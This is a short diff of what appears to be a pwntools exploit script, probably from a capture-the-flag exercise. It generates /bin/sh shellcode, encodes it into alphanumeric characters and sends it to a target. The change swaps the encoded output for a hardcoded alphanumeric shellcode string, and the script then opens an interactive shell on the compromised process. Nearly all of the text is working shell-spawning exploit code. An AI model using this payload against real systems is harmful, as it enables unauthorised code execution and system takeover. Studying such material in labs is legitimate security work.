@@ -6,5 +6,6 @@ cmd = asm(shellcraft.sh())
 encoded = pwnlib.encoders.encode(cmd, expr=r'[^A-Z0-9]')
 print(cmd)
 print(encoded)
-r.send(encoded)
+test="IIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIFQ8IJWM1NP4KBH6OD3U8EP58VO52CY2NLIKSXMK0AA"
+r.send(test)
 r.interactive()
